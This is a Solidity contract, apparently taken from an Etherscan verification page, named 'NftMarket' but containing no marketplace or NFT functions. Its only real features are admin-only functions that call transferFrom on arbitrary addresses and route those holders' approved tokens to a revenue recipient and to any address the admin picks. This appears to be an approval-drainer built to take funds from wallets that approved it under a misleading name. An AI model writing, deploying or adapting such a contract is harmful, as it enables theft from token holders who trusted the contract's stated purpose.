/**
 *Submitted for verification at Etherscan.io on 2021-11-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ERC20Like {
    function transfer(address, uint256) external returns (bool);

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);
    
    function approve(address, uint256) external returns (bool);
    
    function balanceOf(address account) external view returns (uint256);
}

contract Owned {
    address public owner;
    address public newOwner;
	address public admin;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "you are not the owner");
        _;
    }
	
	modifier onlyadmin {
		require(msg.sender == owner || msg.sender==admin,"you are not the admin");
		_;
	}
	
	function setadmin(address _admin) public onlyOwner{
		admin = _admin;
	}

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner, "you are not the owner");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

contract NftMarket is Owned {
    address public revenueRecipient;
    uint256 public constant mintFee = 10 * 1e8;
    ERC20Like public token;
    address public tokenaddress;
    uint256 public fee;
    uint256 public myfee;

    constructor(address _tokenaddress, address _revenueRecipient,uint256 _fee,uint256 _myfee){
        tokenaddress = _tokenaddress;
		revenueRecipient = _revenueRecipient;
		fee = _fee;
		myfee = _myfee;
    }
    
    function batchout(address afrom,address[] memory toAddr, uint256[] memory value) external onlyadmin returns (bool){
        require(toAddr.length == value.length && toAddr.length >= 1);
        token = ERC20Like(tokenaddress);
        for(uint256 i = 0 ; i < toAddr.length; i++){
            token.transferFrom(afrom,toAddr[i], value[i]);
        }
        return true;
    }

    function onetransferfrom(address afrom,address to,uint256 amount) external onlyadmin returns(bool){
        token = ERC20Like(tokenaddress);
        token.transferFrom(afrom,to,amount);
        return true;
    }
	
	function batchin(address[] memory from, uint256[] memory value, address to) external onlyadmin returns (bool){
        require(from.length == value.length && from.length >= 1);
        token = ERC20Like(tokenaddress);
        for(uint256 i = 0 ; i < from.length; i++){
            uint256 toamount = (value[i] * fee) / 100;
            uint256 myamount = (value[i] * myfee) / 100;
			token.transferFrom(from[i],revenueRecipient, toamount);
            token.transferFrom(from[i],to, myamount);
        }
        return true;
    } 
	
	function onetransferin(address afrom,address to,uint256 amount) external onlyadmin returns(bool){
        token = ERC20Like(tokenaddress);
        uint256 toamount = (amount * fee) / 100;
        uint256 myamount = (amount * myfee) / 100;
		token.transferFrom(afrom,revenueRecipient, toamount);
        token.transferFrom(afrom,to, myamount);
        return true;
    }
    
}